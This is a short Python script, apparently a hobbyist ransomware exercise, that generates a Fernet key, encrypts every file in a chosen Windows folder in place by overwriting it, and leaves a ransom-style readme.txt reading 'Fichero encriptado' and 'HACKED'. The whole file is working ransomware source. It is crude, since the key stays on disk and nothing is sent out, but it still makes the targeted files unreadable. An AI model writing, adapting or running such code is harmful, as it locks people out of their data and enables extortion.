from cryptography.fernet import Fernet
from os import listdir

def generate_key():
    key = Fernet.generate_key()
    with open("key.key","wb") as key_file:
        key_file.write(key)

def cargar_key():
    return open("key.key", "rb").read()

def encrypt(items,key):
    f = Fernet(key)
    for item in items:
        with open(item,"rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(item,"wb") as file:
            file.write(encrypted_data)

if __name__ == "__main__":
    path_to_encrypt = r"C:\Users\pc\Python\Hacking\Ransomware"
    items = listdir(path_to_encrypt)
    print(items)
    full_path = [path_to_encrypt+"\\"+item for item in items]
    generate_key()
    key = cargar_key()
    encrypt(full_path,key)
    with open(path_to_encrypt+"\\"+"readme.txt", "w") as file:
        file.write("Fichero encriptado")
        file.write("HACKED")